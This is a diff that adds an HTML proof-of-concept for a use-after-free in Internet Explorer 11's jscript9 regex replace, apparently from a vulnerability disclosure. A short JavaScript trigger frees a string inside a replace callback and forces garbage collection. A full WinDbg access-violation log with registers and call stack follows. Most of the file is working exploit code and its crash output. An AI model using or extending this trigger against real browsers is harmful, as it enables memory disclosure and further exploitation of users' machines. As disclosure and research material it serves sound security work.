@@ -1,0 +1,102 @@
+<!--
+There is a Use-after-free vulnerability in Internet Explorer that could potentially be used for memory disclosure.
+
+This was tested on IE11 running on Window 7 64-bit with the latest patches applied. Note that the PoC was tested in a 64-bit tab process via TabProcGrowth=0 registry flag and the page heap was enabled for iexplore.exe (The PoC is somewhat unreliable so applying these settings might help with reproducing).
+
+PoC:
+
+=========================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<script>
+var vars = new Array(2);
+function main() {
+  vars[0] = Array(1000000).join(String.fromCharCode(0x41));
+  vars[1] = String.prototype.substring.call(vars[0], 1, vars[0].length);
+  String.prototype.replace.call(vars[1], RegExp(), f);
+}
+function f(arg1, arg2, arg3) {
+  alert(arg3);
+  vars[0] = 1;
+  CollectGarbage();
+  return 'a';
+}
+main();
+</script>
+
+<!--
+=========================================
+
+Debug log:
+
+=========================================
+
+(be0.c40): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+jscript9!Js::RegexHelper::RegexReplaceT<0>+0x122e5d:
+000007fe`ecc3b26d 440fb73c41      movzx   r15d,word ptr [rcx+rax*2] ds:00000000`18090022=????
+
+0:013> r
+rax=0000000000000000 rbx=0000000000000000 rcx=0000000018090022
+rdx=0000000000000001 rsi=0000000000000000 rdi=0000000000000000
+rip=000007feecc3b26d rsp=0000000011e4a590 rbp=0000000011e4a610
+ r8=fffc000000000000  r9=00000000000f423e r10=fffc000000000000
+r11=0000000000000008 r12=0000000000000000 r13=00000000148c5340
+r14=000007feec9b1240 r15=0000000000000000
+iopl=0         nv up ei ng nz ac pe cy
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010293
+jscript9!Js::RegexHelper::RegexReplaceT<0>+0x122e5d:
+000007fe`ecc3b26d 440fb73c41      movzx   r15d,word ptr [rcx+rax*2] ds:00000000`18090022=????
+
+0:013> k
+ # Child-SP          RetAddr           Call Site
+00 00000000`11e4a590 000007fe`eca1282d jscript9!Js::RegexHelper::RegexReplaceT<0>+0x122e5d
+01 00000000`11e4a9d0 000007fe`ec9b9ee3 jscript9!Js::JavascriptString::EntryReplace+0x1e6
+02 00000000`11e4aa70 000007fe`ec9b9b5d jscript9!amd64_CallFunction+0x93
+03 00000000`11e4aad0 000007fe`eca325e9 jscript9!Js::JavascriptFunction::CallFunction<1>+0x6d
+04 00000000`11e4ab10 000007fe`ec9b9ee3 jscript9!Js::JavascriptFunction::EntryCall+0xd9
+05 00000000`11e4ab70 000007fe`ecbe6e56 jscript9!amd64_CallFunction+0x93
+06 00000000`11e4abe0 000007fe`ec9bd8e0 jscript9!Js::InterpreterStackFrame::Process+0x1071
+07 00000000`11e4af20 00000000`14cc0fbb jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x386
+08 00000000`11e4b1a0 000007fe`ec9b9ee3 0x14cc0fbb
+09 00000000`11e4b1d0 000007fe`ecbe6e56 jscript9!amd64_CallFunction+0x93
+0a 00000000`11e4b220 000007fe`ec9bd8e0 jscript9!Js::InterpreterStackFrame::Process+0x1071
+0b 00000000`11e4b560 00000000`14cc0fc3 jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x386
+0c 00000000`11e4b790 000007fe`ec9b9ee3 0x14cc0fc3
+0d 00000000`11e4b7c0 000007fe`ec9b9b5d jscript9!amd64_CallFunction+0x93
+0e 00000000`11e4b810 000007fe`ec9b9d2e jscript9!Js::JavascriptFunction::CallFunction<1>+0x6d
+0f 00000000`11e4b850 000007fe`ec9b9e2f jscript9!Js::JavascriptFunction::CallRootFunction+0x110
+10 00000000`11e4b930 000007fe`ec9b9d88 jscript9!ScriptSite::CallRootFunction+0x63
+11 00000000`11e4b990 000007fe`ecae3a22 jscript9!ScriptSite::Execute+0x122
+12 00000000`11e4ba20 000007fe`ecae2e75 jscript9!ScriptEngine::ExecutePendingScripts+0x208
+13 00000000`11e4bb10 000007fe`ecae4924 jscript9!ScriptEngine::ParseScriptTextCore+0x4a5
+14 00000000`11e4bc70 000007fe`e912fb61 jscript9!ScriptEngine::ParseScriptText+0xc4
+15 00000000`11e4bd20 000007fe`e912f9cb MSHTML!CActiveScriptHolder::ParseScriptText+0xc1
+16 00000000`11e4bda0 000007fe`e912f665 MSHTML!CJScript9Holder::ParseScriptText+0xf7
+17 00000000`11e4be50 000007fe`e9130a3b MSHTML!CScriptCollection::ParseScriptText+0x28c
+18 00000000`11e4bf30 000007fe`e91305be MSHTML!CScriptData::CommitCode+0x3d9
+19 00000000`11e4c100 000007fe`e9130341 MSHTML!CScriptData::Execute+0x283
+1a 00000000`11e4c1c0 000007fe`e98bfeac MSHTML!CHtmScriptParseCtx::Execute+0x101
+1b 00000000`11e4c200 000007fe`e988f02b MSHTML!CHtmParseBase::Execute+0x235
+1c 00000000`11e4c2a0 000007fe`e9111a79 MSHTML!CHtmPost::Broadcast+0x115
+1d 00000000`11e4c2e0 000007fe`e90a215f MSHTML!CHtmPost::Exec+0x4bb
+1e 00000000`11e4c4f0 000007fe`e90a20b0 MSHTML!CHtmPost::Run+0x3f
+1f 00000000`11e4c520 000007fe`e90a35ac MSHTML!PostManExecute+0x70
+20 00000000`11e4c5a0 000007fe`e90a73a3 MSHTML!PostManResume+0xa1
+21 00000000`11e4c5e0 000007fe`e909482f MSHTML!CHtmPost::OnDwnChanCallback+0x43
+22 00000000`11e4c630 000007fe`e991f74e MSHTML!CDwnChan::OnMethodCall+0x41
+23 00000000`11e4c660 000007fe`e90c7c25 MSHTML!GlobalWndOnMethodCall+0x240
+24 00000000`11e4c700 00000000`77449bbd MSHTML!GlobalWndProc+0x150
+25 00000000`11e4c780 00000000`774498c2 USER32!UserCallWinProcCheckWow+0x1ad
+26 00000000`11e4c840 000007fe`f1d91aab USER32!DispatchMessageWorker+0x3b5
+27 00000000`11e4c8c0 000007fe`f1ce59bb IEFRAME!CTabWindow::_TabWindowThreadProc+0x555
+28 00000000`11e4fb40 000007fe`fda7572f IEFRAME!LCIETab_ThreadProc+0x3a3
+29 00000000`11e4fc70 000007fe`fa87925f iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1f
+2a 00000000`11e4fca0 00000000`773259cd IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x9f
+2b 00000000`11e4fcf0 00000000`7755a561 kernel32!BaseThreadInitThunk+0xd
+2c 00000000`11e4fd20 00000000`00000000 ntdll!RtlUserThreadStart+0x1d
+
+=========================================
+-->
